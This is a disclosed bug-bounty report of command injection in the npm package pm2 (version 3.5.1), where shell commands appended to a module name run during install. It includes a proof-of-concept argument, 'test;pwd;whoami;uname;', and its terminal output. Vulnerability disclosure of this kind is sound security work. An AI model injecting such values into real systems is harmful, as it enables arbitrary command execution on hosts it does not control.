# [M] Command Injection in npm module name passed as an argument to pm2.install() function

## Summary
Severity: Medium (CVSS 6.4)
Program: Node.js third-party modules
Weakness: Command Injection - Generic
Reporter: bl4de
State: resolved
Disclosed: 2019-10-24T09:52:54.847Z
Source: https://hackerone.com/reports/633364

## Details
Hi Lads,

I would like to report Command Injection possible when npm module name is passed into `pm2.install()`. An attacker is able to attach OS commands to npm module name and those commands will be executed when payload reaches execution sink in `continueInstall()` function in `API/Modules/NPM.js` file.

# Module

**module name:** pm2
**version:** 3.5.1
**npm page:** `https://www.npmjs.com/package/pm2`

## Module Description

PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.

## Module Stats

**~320.000 downloads/week**
**>1.200.000 downloads/month**

# Vulnerability

npm packages can be installed using `pm2 install [PACKAGE NAME]` command run from command line or as a call to `pm2.install(PACKAGE_NAME)` when `pm2` API is used in programmatic way. Both ways of execution are vulnerable.

Here's an example of exploitation when `test` package is installed from command line with `pm2 install "test;pwd;whoami;uname;"` command:

```
bl4de:~/playground/Node $ ./pm2 install "test;pwd;whoami;uname;"
[PM2][Module] Installing NPM test;pwd;whoami;uname; module
[PM2][Module] Calling [NPM] to install test;pwd;whoami;uname; ...
npm WARN saveError ENOENT: no such file or directory, open '/Users/bl4de/package.json'
npm WARN enoent ENOENT: no such file or directory, open '/Users/bl4de/package.json'
npm WARN bl4de No description
npm WARN bl4de No repository field.
npm WARN bl4de No README data
npm WARN bl4de No license field.

+ test@0.6.0
updated 1 package and audited 3 packages in 0.902s
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/633364_
